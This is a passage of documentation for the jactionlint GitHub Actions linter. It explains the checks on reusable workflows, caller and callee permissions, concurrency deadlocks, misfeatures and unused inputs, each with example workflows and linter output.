**What is not reported.** Nothing is reported for a job that runs on a `self-hosted` runner, because the tools of the GitHub-hosted images are not there and the action is what installs them. A runner that cannot be shown to be hosted counts as self-hosted. A `runs-on:` that is an expression is resolved to the labels it can have, and the job is reported when the repository tells all of them and none is `self-hosted`:

- A label that is text and matrix values (`${{ matrix.os }}-latest`, `${{ matrix.target.os }}`) is resolved for each value of the matrix, and so is `${{ matrix.os }}` with a list of labels as a value.
- A condition between labels, `${{ github.event_name == 'push' && 'ubuntu-24.04' || 'macos-14' }}`. The condition is not evaluated: every label of the result counts, so one `self-hosted` branch, or one branch that is not known (`vars.RUNNER`, `inputs.runner` without a caller), keeps the job unreported. `${{ vars.RUNNER || 'ubuntu-24.04' }}` is not resolved either, because the variable may be the runner.
- `fromJSON()` of a text that is known: `${{ fromJSON('["ubuntu-24.04", "x64"]') }}`, or `${{ fromJSON(inputs.runner) }}` when the callers pass a JSON text.
- `${{ inputs.<name> }}` in a reusable workflow that only `workflow_call` starts and that workflows of the same repository call (`uses: ./.github/workflows/x.yml`), when every caller passes a value that is resolved the same way, or leaves the input out and the `default:` of the input is a text. A workflow that nothing in the repository calls, or that a person can also start, is not resolved, and neither is a caller that passes its own input down (`inputs.runner` of the caller): the callers are followed one level.

Nothing else is resolved, so nothing is reported for `${{ vars.RUNNER }}`, `${{ env.RUNNER }}`, `${{ secrets.RUNNER }}`, an output of another job, a runner group, a label of a provider such as `runs-on=${{ github.run_id }}/runner=...`, or a matrix that is computed (`fromJSON(needs.setup.outputs.matrix)`). A resolved label is judged like one written in the file: a label other than `self-hosted`, such as the name of a larger runner, counts as GitHub-hosted. Calls of the reusable workflow from other repositories are not known.

<a id="check-misfeature"></a>
## Misfeatures

The rule `misfeature` reports a feature of GitHub Actions that is best avoided. It is in the `default` profile and reports `error`. It reports:

- the `pip-install` input of `actions/setup-python`. It installs packages into the global Python environment, which is hard to audit and can break the resolution of dependencies. Create a virtual environment in a `run:` step instead;
- the Windows `cmd` shell (`shell: cmd`). It has no formal grammar, so a script cannot be analyzed reliably. Use `pwsh`, `bash` or another shell instead.

With the option `pedantic` (on under the `pedantic` profile) the rule also reports a shell that GitHub does not document (the documented ones are `bash`, `pwsh`, `powershell`, `python`, `sh` and `cmd`), like `shell: perl {0}`. Such a shell may not exist on every runner and its scripts cannot be analyzed. A shell name that the runner OS does not provide (`cmd` on Linux, for example) is reported by [shell names](#check-shell-names). The rule has no automatic fix.

Example input:

```yaml
on: push

jobs:
  test:
    runs-on: windows-latest
    steps:
      - uses: actions/setup-python@v6
        with:
          pip-install: .[dev]
      - run: echo hello
        shell: cmd
```

Output:

```
test.yaml:9:11: "pip-install" of actions/setup-python installs packages into the global Python environment, which is hard to audit and can break the resolution of dependencies. create a virtual environment and install the packages in a "run:" step instead [misfeature]
  |
9 |           pip-install: .[dev]
  |           ^~~~~~~~~~~~
test.yaml:11:16: shell "cmd" is the Windows cmd shell, which has no formal grammar so scripts cannot be analyzed reliably, and it has not been the default shell of Windows runners since 2019. use "pwsh", "bash" or another shell instead [misfeature]
   |
11 |         shell: cmd
   |                ^~~
```

<!-- Skip playground link -->

<a id="check-reusable-workflows"></a>
## Reusable workflows

A [reusable workflow](https://docs.github.com/en/actions/learn-github-actions/reusing-workflows) is a workflow that other workflows call with `uses:` in a job. jactionlint checks the workflow that is called (the callee) and the job that calls it (the caller) with these rules, which are in the `correctness` profile and so run in every profile:

| Rule | Reports |
| --- | --- |
| `invalid-workflow-call-input` | an input of `on.workflow_call` whose default value does not fit its type, or that is required and has a default value |
| `invalid-workflow-call` | a call whose `uses:` does not follow the format of a reusable workflow |
| `invalid-local-workflow` | a called workflow of the repository that does not exist, cannot be parsed or has no `workflow_call` event |
| `missing-workflow-input`, `missing-workflow-secret` | a call that does not pass a required input or secret |
| `unknown-workflow-input`, `unknown-workflow-secret` | a call that passes an input or secret which the called workflow does not define |
| `workflow-input-type` | a value passed to an input of another type |
| `workflow-call-permissions` | a called job that needs permissions which the calling job does not grant |

The examples also show findings of rules that are not specific to reusable workflows: `workflow-syntax` for keys and types, `undefined-property` for unknown properties of `inputs`, `secrets` and `needs`, [`template-injection`](./rules.md#template-injection) and [`unused-job-output`](#check-unused-job-output).

The checks of a call read the called workflow from the repository when `uses:` starts with `./` or `$/`. A workflow of another repository is read only with `--online`, see [Reusable workflows of other repositories (online)](#check-remote-reusable-workflows).

### Check input definitions of `workflow_call` event in reusable workflow

Example input:

```yaml
on:
  workflow_call:
    inputs:
      scheme:
        description: Scheme of URL
        # OK: Type is string
        default: https
        type: string
      host:
        default: example.com
        type: string
      port:
        description: Port of URL
        # ERROR: Type is number but default value is string
        default: ':1234'
        type: number
      query:
        description: Query of URL
        # ERROR: Type must be one of number, string, boolean
        type: object
      path:
        description: Path of URL
        required: true
        # ERROR: Default value is never used since this input is required
        default: ''
        type: string
jobs:
  do:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ inputs.scheme }}://${{ inputs.host }}:${{ inputs.port }}${{ inputs.path }}"
```

Output:

```
test.yaml:15:18: input of workflow_call event "port" is typed as number but its default value ":1234" cannot be parsed as a float number: strconv.ParseFloat: parsing ":1234": invalid syntax [invalid-workflow-call-input]
   |
15 |         default: ':1234'
   |                  ^~~~~~~
test.yaml:20:15: invalid value "object" for input type of workflow_call event. it must be one of "boolean", "number", or "string" [workflow-syntax]
   |
20 |         type: object
   |               ^~~~~~
test.yaml:25:18: input "path" of workflow_call event has the default value "", but it is also required. if an input is marked as required, its default value will never be used [invalid-workflow-call-input]
   |
25 |         default: ''
   |                  ^~
test.yaml:31:24: "inputs.scheme" is an input chosen by whoever runs this, which is not validated and can hold shell syntax. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [template-injection]
   |
31 |       - run: echo "${{ inputs.scheme }}://${{ inputs.host }}:${{ inputs.port }}${{ inputs.path }}"
   |                        ^~~~~~~~~~~~~
test.yaml:31:47: "inputs.host" is an input chosen by whoever runs this, which is not validated and can hold shell syntax. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [template-injection]
   |
31 |       - run: echo "${{ inputs.scheme }}://${{ inputs.host }}:${{ inputs.port }}${{ inputs.path }}"
   |                                               ^~~~~~~~~~~
test.yaml:31:84: "inputs.path" is an input chosen by whoever runs this, which is not validated and can hold shell syntax. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [template-injection]
   |
31 |       - run: echo "${{ inputs.scheme }}://${{ inputs.host }}:${{ inputs.port }}${{ inputs.path }}"
   |                                                                                    ^~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNp8kctu8yAQhff/U4yiX8oqiXpZ8Qxd9KKuK4zHxSlmyDAojSLevcJ2IsuNu4NvZg6HOeTVP4Aj8Vfj6PhhtHMFALQ+JInDGSAaix1ebgA1RsNtkJa8gre+CNTA++vTpKXRyYkCKxLiFcspoIIo3PrPEVqKon7P4bfugsOtoe6v6UAsC8aeiWXR1lrd3T88rmfSPnUV8ggPCfm0oP1SanPxQYOqPRq52NNil+xpsXMFxkNqGWsFwglvuF7f3sWeqj6smlTfwMnHTXkkVclL2jgtGAdPUTBcg92UTgVoLMHq//k85r4dAoec1W43wSWqAieo7B9ynpLyr5xXPwMAtTmuwA==)

Unlike the inputs of an action, the inputs of a reusable workflow must specify a type: `boolean`, `number` or `string`. `invalid-workflow-call-input` reports a default value that cannot be parsed as the type of the input, and a default value on a required input, which GitHub never uses. `workflow-syntax` reports a type that is none of the three. The last three findings of the output are `template-injection`: the value of an input is chosen by whoever runs the workflow, so it does not belong in a `run:` script. See [Creating a reusable workflow](https://docs.github.com/en/actions/learn-github-actions/reusing-workflows#creating-a-reusable-workflow) in the GitHub documentation.

### Check workflow call syntax

Example input:

```yaml
on: push
jobs:
  job1:
    uses: owner/repo/path/to/workflow.yml@v1
    # ERROR: 'runs-on' is not available on calling reusable workflow
    runs-on: ubuntu-latest
  job2:
    # ERROR: Local file path with ref is not available
    uses: ./.github/workflows/ci.yml@main
  job3:
    # ERROR: 'with' is only available on calling reusable workflow
    with:
      foo: bar
    runs-on: ubuntu-latest
    steps:
      - run: echo hello
  job4:
    # ERROR: This workflow does not exist
    uses: ./.github/workflows/not-existing.yml
```

Output:

```
test.yaml:6:5: when a reusable workflow is called with "uses", "runs-on" is not available. only following keys are allowed: "name", "uses", "with", "secrets", "needs", "if", "permissions", and "cache-mode" in job "job1" [workflow-syntax]
  |
6 |     runs-on: ubuntu-latest
  |     ^~~~~~~~
test.yaml:9:11: reusable workflow call "./.github/workflows/ci.yml@main" at "uses" is not following the format "owner/repo/path/to/workflow.yml@ref" nor "./path/to/workflow.yml" nor "$/path/to/workflow.yml". see https://docs.github.com/en/actions/learn-github-actions/reusing-workflows for more details [invalid-workflow-call]
  |
9 |     uses: ./.github/workflows/ci.yml@main
  |           ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:12:5: "with" is only available for a reusable workflow call with "uses" but "uses" is not found in job "job3" [workflow-syntax]
   |
12 |     with:
   |     ^~~~~
test.yaml:19:11: could not read reusable workflow file for "./.github/workflows/not-existing.yml": open /path/to/repo/.github/workflows/not-existing.yml: no such file or directory [invalid-local-workflow]
   |
19 |     uses: ./.github/workflows/not-existing.yml
   |           ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNqEzjFywyAQBdBep9gLIEZJKqpcBTQrgYJYhl1CcnsPYuxxZVdQ/P/2UzKQK/vpIMdmAjjILf0FqIxsgFrCogtm0tmK10K6UfnZIrX5/4zfv8sVLjWx6lh1NUlV0QqyDO/j2Zv1vAfx1T0Y1mu4qNOGNBqfo9GC+PED2IgMOFteXwNgwcz3kupJA7h6Ao8x0uC/3g1KJAr/AktIe592GwBtJVzI)

A job that calls a reusable workflow supports [only some keys](https://docs.github.com/en/actions/learn-github-actions/reusing-workflows#supported-keywords-for-jobs-that-call-a-reusable-workflow). `workflow-syntax` reports a key that does not belong to the kind of job: `runs-on` or `timeout-minutes` on a job that calls a workflow (the called workflow decides where its jobs run), and `with` or `secrets` on a job that runs steps.

The value of `uses:` of a call must follow one of the formats `owner/repo/path/to/workflow.yml@ref`, `./path/to/workflow.yml` or `$/path/to/workflow.yml`, as described in [Creating a reusable workflow](https://docs.github.com/en/actions/learn-github-actions/reusing-workflows#creating-a-reusable-workflow). `invalid-workflow-call` reports any other value, such as a local path with a ref.

`invalid-local-workflow` reports a call of a workflow of the repository (`./` or `$/`) when the file does not exist or cannot be read, cannot be parsed, or has no `workflow_call` event.

### Check types of `inputs.*` and `secrets.*` in reusable workflow

Example input:

```yaml
on:
  workflow_call:
    inputs:
      url:
        description: 'your URL'
        type: string
      lucky_number:
        description: 'your lucky number'
        type: number
    secrets:
      credential:
        description: 'your credential'

jobs:
  test:
    runs-on: ubuntu-24.04
    steps:
      - name: Send data
        # ERROR: uri is typo of url
        run: curl ${{ inputs.uri }} -d ${{ inputs.lucky_number }}
        env:
          # ERROR: credentials is typo of credential
          TOKEN: ${{ secrets.credentials }}
```

Output:

```
test.yaml:20:23: "inputs.uri" is an input chosen by whoever runs this, which is not validated and can hold shell syntax. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [template-injection]
   |
20 |         run: curl ${{ inputs.uri }} -d ${{ inputs.lucky_number }}
   |                       ^~~~~~~~~~
test.yaml:20:23: property "uri" is not defined in object type {lucky_number: number; url: string} [undefined-property]
   |
20 |         run: curl ${{ inputs.uri }} -d ${{ inputs.lucky_number }}
   |                       ^~~~~~~~~~
test.yaml:23:22: property "credentials" is not defined in object type {actions_runner_debug: string; actions_step_debug: string; credential: string; github_token: string} [undefined-property]
   |
23 |           TOKEN: ${{ secrets.credentials }}
   |                      ^~~~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNp8UL1q80AQ7PUUU3ygSuIjuLo+VUIC+amNdNqEi897Yu82Rph792CdIpkU7pbZ+dnZwKYCTkEOHz6c9rbz/gIAjkdNscyAiv8dgYGiFTcmF9ignoIK3l8e63WfppEMYhLHnwvo1R6mPeuxJ7lpNBNRiH8dCzqDkazQdp4VGoiT625fudHqqvoK/axPFFNRiXJsLmztlZM2d7v2/67EJRrXsAbcHcnglXjA0KVujRRlA6vi8e98Xj7YqjjkjGa4Bq//gZxXB+LvrQHw9vxw/2Rm4dK43TpE5PwzAKvehKY=)

In a job of a reusable workflow, `inputs.*` holds the inputs that `on.workflow_call.inputs` defines and `secrets.*` holds the secrets that `on.workflow_call.secrets` defines. jactionlint types both contexts from the definition: `inputs` allows only the defined names, each typed by its `type:`, and `secrets` allows only the defined names and the secrets that GitHub always provides, such as `GITHUB_TOKEN`. `undefined-property` reports any other name, such as the typos `inputs.uri` and `secrets.credentials` in the example. See [Creating a reusable workflow](https://docs.github.com/en/actions/learn-github-actions/reusing-workflows#creating-a-reusable-workflow).

A caller can pass all its secrets to a reusable workflow with `secrets: inherit` ([announcement](https://github.blog/changelog/2022-05-03-github-actions-simplify-using-secrets-with-reusable-workflows/)):

```yaml
jobs:
  pass-secrets-to-workflow:
    uses: ./.github/workflows/called-workflow.yml
    secrets: inherit
```

When jactionlint checks a reusable workflow, it cannot know whether the callers inherit the secrets. It assumes:

- When `secrets:` is omitted in a reusable workflow, the workflow inherits the secrets of the caller, so any `secrets.NAME` is accepted.
- When `secrets:` exists in a reusable workflow, the workflow inherits no other secret, so `secrets.NAME` is reported unless it is defined there.

This workflow omits `secrets:`, so `secrets.FOO` is assumed to come from the caller and is not reported:

```yaml
on:
  workflow_call:

jobs:
  pass-secret-to-action:
    runs-on: ubuntu-latest
    steps:
      # OK: This reports no error. FOO is assumed to be inherited from caller
      - run: echo ${{ secrets.FOO }}
```

This workflow has a `secrets:` key without entries, so it inherits nothing, and `undefined-property` reports `secrets.FOO`:

```yaml
on:
  workflow_call:
    secrets:

jobs:
  pass-secret-to-action:
    runs-on: ubuntu-latest
    steps:
      # ERROR: Secret FOO is not defined
      - run: echo ${{ secrets.FOO }}
```

### Check outputs in reusable workflow

Example input:

```yaml
on:
  workflow_call:
    outputs:
      image-version:
        description: "Docker image version"
        # ERROR: 'imagetag' does not exist (typo of 'image_tag')
        value: ${{ jobs.gen-image-version.outputs.imagetag }}
jobs:
  gen-image-version:
    runs-on: ubuntu-latest
    outputs:
      image_tag: "${{ steps.get_tag.outputs.tag }}"
    steps:
      - run: ./output_image_tag.sh
        id: get_tag
```

Output:

```
test.yaml:7:20: property "imagetag" is not defined in object type {image_tag: string} [undefined-property]
  |
7 |         value: ${{ jobs.gen-image-version.outputs.imagetag }}
  |                    ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:12:7: output "image_tag" of job "gen-image-version" is never used: no other job reads "needs.gen-image-version.outputs.image_tag" and no output of the workflow uses it. remove it [unused-job-output]
   |
12 |       image_tag: "${{ steps.get_tag.outputs.tag }}"
   |       ^~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNp0j8FuwyAQRO/5ipHVK/TOuf9hEWdLaShY7JIcovx7tcZGqqocGT3mzZbsTsC91OtnKvd58SlpAJQmaxPuDyD++EDmRpVjyUcIXIiXGlfRENNHWa5UO4udnQZ786mRw9vjge9yZhsomz+1dnfaLRUf8HyeFFXfP7qPqC2zUXk7tyzNJC/E8vKCWXxwmHQDC606QjQb6m7tozfi+G5U5WDfOzmPOstf48R4cdgbfwcA2ORuYw==)

A reusable workflow defines its outputs at `on.workflow_call.outputs`, as described in [using outputs from a reusable workflow](https://docs.github.com/en/actions/using-workflows/reusing-workflows#using-outputs-from-a-reusable-workflow). The `value` of an output reads the outputs of the jobs of the workflow through the `jobs` context. `undefined-property` reports a job or an output of a job that does not exist, such as `imagetag` in the example. The typo also leaves the output `image_tag` of the job unread, which `unused-job-output` reports.

### Check inputs and secrets in workflow call

The example calls the reusable workflow `.github/workflows/reusable.yaml`.

Example input:

```yaml
# select: missing-workflow-input,missing-workflow-secret,unknown-workflow-input,unknown-workflow-secret,workflow-input-type
on: push

jobs:
  # Check required/undefined inputs and secrets
  missing-required:
    uses: ./.github/workflows/reusable.yaml
    with:
      # ERROR: Undefined input
      user: rhysd
      # ERROR: Required input "name" is missing
    secrets:
      # ERROR: Undefined secret
      credentials: my-token
      # ERROR: Required secret "password" is missing

  # Check types of inputs defined in reusable workflow
  type-checks:
    uses: ./.github/workflows/reusable.yaml
    with:
      name: rhysd
      # ERROR: Cannot assign bool value to number input
      id: true
      # ERROR: Cannot assign null to string input. If you want to pass string "null", use ${{ 'null' }}
      message: null
    secrets:
      password: p@ssw0rd
```

Example file: .github/workflows/reusable.yaml

```yaml
on:
  workflow_call:
    inputs:
      name:
        type: string
        required: true
      id:
        type: number
      message:
        type: string
    secrets:
      password:
        required: true

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo '${{ inputs.name }}'
```

Output:

```
test.yaml:7:11: input "name" is required by "./.github/workflows/reusable.yaml" reusable workflow [missing-workflow-input]
  |
7 |     uses: ./.github/workflows/reusable.yaml
  |           ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:7:11: secret "password" is required by "./.github/workflows/reusable.yaml" reusable workflow [missing-workflow-secret]
  |
7 |     uses: ./.github/workflows/reusable.yaml
  |           ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:10:7: input "user" is not defined in "./.github/workflows/reusable.yaml" reusable workflow. defined inputs are "id", "message", "name" [unknown-workflow-input]
   |
10 |       user: rhysd
   |       ^~~~~
test.yaml:14:7: secret "credentials" is not defined in "./.github/workflows/reusable.yaml" reusable workflow. defined secret is "password" [unknown-workflow-secret]
   |
14 |       credentials: my-token
   |       ^~~~~~~~~~~~
test.yaml:23:11: input "id" is typed as number by reusable workflow "./.github/workflows/reusable.yaml". bool value cannot be assigned [workflow-input-type]
   |
23 |       id: true
   |           ^~~~
test.yaml:25:16: input "message" is typed as string by reusable workflow "./.github/workflows/reusable.yaml". null value cannot be assigned [workflow-input-type]
   |
25 |       message: null
   |                ^~~~
```

<!-- Skip playground link -->

A reusable workflow defines required and optional inputs and secrets, and a call passes values to them. Every input of a reusable workflow has a `type:`, and a call passes constants (`input: 42`) or expressions (`input: ${{ ... }}`), which jactionlint types. The rules compare the call with the definition:

- `missing-workflow-input` and `missing-workflow-secret` report a required input or secret that the call does not pass.
- `unknown-workflow-input` and `unknown-workflow-secret` report a name that the called workflow does not define, and list the names that it defines.
- `workflow-input-type` reports a value that cannot be assigned to the type of the input.

A call with `secrets: inherit` passes every secret of the caller, so its secrets are not compared with the definition. This check reads a called workflow of the repository (`./` or `$/`). For a workflow of another repository it needs `--online`, see [Reusable workflows of other repositories (online)](#check-remote-reusable-workflows).

### Check outputs of workflow call in downstream jobs

The example calls the reusable workflow `.github/workflows/get-build-info.yaml`.

Example input:

```yaml
# select: undefined-property
on: push

jobs:
  get_build_info:
    uses: ./.github/workflows/get-build-info.yaml
  downstream:
    needs: [get_build_info]
    runs-on: ubuntu-latest
    steps:
      # OK. `version` is defined in the reusable workflow
      - run: echo '${{ needs.get_build_info.outputs.version }}'
      # ERROR: `tag` is not defined in the reusable workflow
      - run: echo '${{ needs.get_build_info.outputs.tag }}'
```

Example file: .github/workflows/get-build-info.yaml

```yaml
on:
  workflow_call:
    outputs:
      version:
        value: ${{ jobs.test.outputs.version }}
        description: version of software

jobs:
  test:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.get_version.outputs.version }}
    steps:
      - run: ...
        id: get_version
```

Output:

```
test.yaml:14:24: property "tag" is not defined in object type {version: string} [undefined-property]
   |
14 |       - run: echo '${{ needs.get_build_info.outputs.tag }}'
   |                        ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

The outputs of a called workflow are set on the outputs of the calling job, which downstream jobs read through `needs:`. The called workflow defines which outputs exist. jactionlint types the outputs object of the calling job from `on.workflow_call.outputs` of the called workflow: in the example, `get-build-info.yaml` has one output `version`, so the object is `{version: string}`, and `undefined-property` reports the unknown name `tag` in the downstream job.

This check reads a called workflow of the repository (`./` or `$/`). For a workflow of another repository it needs `--online`, see [Reusable workflows of other repositories (online)](#check-remote-reusable-workflows).

### Check caller/callee permissions in workflow call

The example calls the reusable workflow `.github/workflows/reusable.yaml`.

Example input:

```yaml
# select: workflow-call-permissions
on:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  # ERROR: Caller does not grant pull-requests: write but the called job requires it.
  caller:
    uses: ./.github/workflows/reusable.yaml
```

Example file: .github/workflows/reusable.yaml

```yaml
on:
  workflow_call:

jobs:
  snapshot:
    # Note: GitHub validates permissions at workflow load time, regardless of `if:`.
    if: github.event_name == 'pull_request'
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      - run: echo snapshot
```

Output:

```
test.yaml:12:11: nested job "snapshot" of "./.github/workflows/reusable.yaml" requires "pull-requests: write" but the calling job grants "pull-requests: none" [workflow-call-permissions]
   |
12 |     uses: ./.github/workflows/reusable.yaml
   |           ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

GitHub validates `permissions:` when it loads a workflow. Every scope that a job of the called workflow declares must also be granted by the calling job. Otherwise the run fails with `startup_failure`, no job runs, and a notification job with `if: failure()` cannot fire. `workflow-call-permissions` compares the effective `permissions:` of each called job (its own or, when absent, the workflow-level block) with the effective grant of the caller (the `permissions:` of the calling job or, when absent, the workflow-level block). It reports each missing scope, and it ignores `if:` on called jobs because GitHub evaluates permissions before any condition runs.

**Fix.** Grant the missing scope in the `permissions:` of the calling job, or of the calling workflow.

**Configure.** When the caller has no `permissions:` block at the workflow level and none on the calling job, the token gets the default of the repository (Settings, Actions, General, "Workflow permissions"), which jactionlint cannot read from a workflow file. It does not guess: it assumes the permissive default, so only a scope that even a read-write token lacks is reported, and the message says so. Set [`assume-default-permissions`](./config.md#permissions) to `restricted` when the repository uses the restricted token (only `contents: read` and `packages: read` are granted), and every other scope that the called workflow needs is reported. The value `permissive` assumes read and write on every scope, `id-token` included, which is also what the check does when the option is not set.

**What is not reported.** A caller workflow that is itself a reusable workflow (`on.workflow_call`) without any `permissions:` block is skipped: it inherits the token permissions of its own caller, which jactionlint cannot see. Only a called workflow of the repository (`./` or `$/`) is compared. The permissions of a workflow of another repository are not compared, even with `--online`.

<a id="check-remote-reusable-workflows"></a>
### Reusable workflows of other repositories (online)

With `--online`, jactionlint reads the reusable workflow of `owner/repo/.github/workflows/x.yml@ref` from GitHub, at that ref. It runs the checks of [inputs and secrets in a workflow call](#check-inputs-and-secrets-in-workflow-call) and of [the outputs of a workflow call in downstream jobs](#check-outputs-of-workflow-call-in-downstream-jobs) on it, the way they run on a workflow of the same repository:

- `missing-workflow-input`, `unknown-workflow-input` and `workflow-input-type` for `with:`
- `missing-workflow-secret` and `unknown-workflow-secret` for `secrets:`
- `undefined-property` for `needs.<id>.outputs.<name>` of the job that calls it

Example input:

```yaml
# requires --online
on: push
jobs:
  call:
    uses: example/workflows/.github/workflows/ci.yml@v1
    with:
      # ERROR: "name" is required, and "nmae" is a typo
      nmae: me
      # ERROR: "count" is a number
      count: many
    # ERROR: the secret "token" is required
    secrets:
      extra: x
  # OK
  ok:
    uses: example/workflows/.github/workflows/ci.yml@v1
    with:
      name: me
    secrets:
      token: ${{ secrets.TOKEN }}
  use:
    needs: ok
    runs-on: ubuntu-latest
    steps:
      # ERROR: the workflow declares only "result"
      - run: echo ${{ needs.ok.outputs.reslt }}
```

Output:

```
test.yaml:5:11: input "name" is required by "example/workflows/.github/workflows/ci.yml@v1" reusable workflow (read from GitHub with --online) [missing-workflow-input]
  |
5 |     uses: example/workflows/.github/workflows/ci.yml@v1
  |           ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:5:11: secret "token" is required by "example/workflows/.github/workflows/ci.yml@v1" reusable workflow (read from GitHub with --online) [missing-workflow-secret]
  |
5 |     uses: example/workflows/.github/workflows/ci.yml@v1
  |           ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:8:7: input "nmae" is not defined in "example/workflows/.github/workflows/ci.yml@v1" reusable workflow (read from GitHub with --online). defined inputs are "count", "dry-run", "name" [unknown-workflow-input]
  |
8 |       nmae: me
  |       ^~~~~
test.yaml:10:14: input "count" is typed as number by reusable workflow "example/workflows/.github/workflows/ci.yml@v1" (read from GitHub with --online). string value cannot be assigned [workflow-input-type]
   |
10 |       count: many
   |              ^~~~
test.yaml:26:23: property "reslt" is not defined in object type {result: string} [undefined-property]
   |
26 |       - run: echo ${{ needs.ok.outputs.reslt }}
   |                       ^~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

`example/workflows` is a made-up repository: the output of the example comes from recorded answers of GitHub, and the first line `# requires --online` only marks the example for the tools that maintain this page. With a real reusable workflow, run `jactionlint --online` to get the same kind of findings.

**What is read.** The workflow file is read once per run for each repository, path and ref, however many jobs and files call it. The cache, the allow and deny lists, the rate limit and `--online=cache` work as described in [the online checks](./online.md#online-checks), and a full commit SHA stays in the cache whatever its age. The ref decides what is read: `@main` is read as it is when jactionlint runs, not as it was when the workflow was written.

**What is not reported.**

- Nothing is reported when the workflow is not known: a private repository, a deny list, a rate limit, a timeout, a file that does not exist at that ref, a file without `on.workflow_call` and a file that jactionlint cannot read give no finding, exactly as without `--online`. The lookup is counted as skipped (`--online=strict` fails on it), except for the repositories that are left out on purpose.
- A workflow of another repository that is not a reusable workflow is not reported as `invalid-local-workflow`, which is only about the repository being linted.
- `secrets: inherit` passes every secret, so the secrets of the call are not compared with the ones that the workflow declares, as for a local workflow.
- The permissions of the called jobs are not compared with the ones of the caller, see [caller/callee permissions](#check-caller-callee-permissions-in-workflow-call).

<a id="check-concurrency-deadlock"></a>
## Concurrency deadlock between a workflow and the workflow it calls

`concurrency-deadlock` (in the `correctness` profile) reports a workflow whose `concurrency:` group is the same as the group of a reusable workflow that it calls, so GitHub detects a deadlock and cancels the run.

Example input:

```yaml
# file: .github/workflows/ci.yml
# select: concurrency-deadlock
on: push

# ERROR: the called workflow has the same group
concurrency:
  group: ${{ github.workflow }}-${{ github.sha }}
  cancel-in-progress: true

jobs:
  build:
    uses: ./.github/workflows/build.yml
```

Example file: .github/workflows/build.yml

```yaml
on: workflow_call

concurrency:
  group: ${{ github.workflow }}-${{ github.sha }}

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: make
```

Output:

```
.github/workflows/ci.yml:7:10: the concurrency group "${{ github.workflow }}-${{ github.sha }}" is the same as the group of the workflow of .github/workflows/build.yml (line 4), which job "build" calls. the called workflow runs inside this one with its `github` context, so both groups are one: this run holds the group while it waits for the called workflow, which waits for the group. GitHub detects the deadlock and cancels the run. give one of the groups a part of its own, for example a suffix such as "-caller" [concurrency-deadlock]
  |
7 |   group: ${{ github.workflow }}-${{ github.sha }}
  |          ^~~
```

<!-- Skip playground link -->

The example is `.github/workflows/ci.yml`, and the called workflow is `.github/workflows/build.yml`.

The output block shows the first line of the finding only. On the command line, jactionlint prints the quoted line of the group under it, as for every finding.

**Why GitHub cancels the run.** A reusable workflow runs inside the run of the workflow that calls it, and the `github` context in it is the one of the caller: `github.workflow` is the name of the caller. So the group `${{ github.workflow }}-${{ github.sha }}` is the same string in both files. The caller holds the group while it waits for the called workflow, and the called workflow waits for the group. GitHub detects the deadlock, cancels the run and says `a deadlock for concurrency group ... was detected` ([actionlint issue 538](https://github.com/rhysd/actionlint/issues/538)).

**Fix.** Give one of the groups a part of its own, for example `${{ github.workflow }}-caller-${{ github.sha }}`.

**What is reported.** The rule reads the workflows of the repository that the workflow calls with `uses: ./.github/workflows/x.yml` (or `$/.github/workflows/x.yml`). It reports the group of the workflow when the group of the called workflow, or of one of its jobs, is the same. It compares groups case-insensitively and without spaces in the expressions.

**What is not reported.** The rule compares a group only when it is written with text, with the properties of the `github` context that have the same value in the caller and the called workflow (`workflow`, `ref`, `sha`, `event_name`, `event.*`, `run_id`, `actor`, ...) and with the functions `format`, `contains`, `startsWith`, `endsWith` and `join`. A group that reads anything else (`inputs`, `matrix`, `github.job`, `hashFiles()`, a `concurrency:` that is one expression) is not compared. The group of a job of the caller is not compared with the called workflow either. A workflow that calls another workflow in turn is compared with its direct callee only.

**Related.** [concurrency-limits](#check-concurrency-limits) gives the same advice for the groups it suggests.

<a id="check-unused-workflow-input"></a>
## Unused workflow inputs (pedantic)

`unused-workflow-input` reports an input of `workflow_dispatch` or `workflow_call` that no expression of the workflow reads: a manual run asks for a value that does nothing, or a caller passes a value that is dropped. The rule is in the `pedantic` profile and reports a warning.

Example input:

```yaml
# select: unused-workflow-input
on:
  workflow_dispatch:
    inputs:
      version:
        type: string
      dry-run:
        type: boolean
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - run: echo ${{ inputs.version }}
```

Example config:

```yaml
rules:
  unused-workflow-input: warn
```

Output:

```
test.yaml:7:7: warning: input "dry-run" of "workflow_dispatch" is never used: no expression reads "inputs.dry-run". remove it or use it [unused-workflow-input]
  |
7 |       dry-run:
  |       ^~~~~~~~
```

<!-- Skip playground link -->

The output lists only the findings of this rule. To get the same findings for a file of your own, run `jactionlint --select unused-workflow-input FILE`.

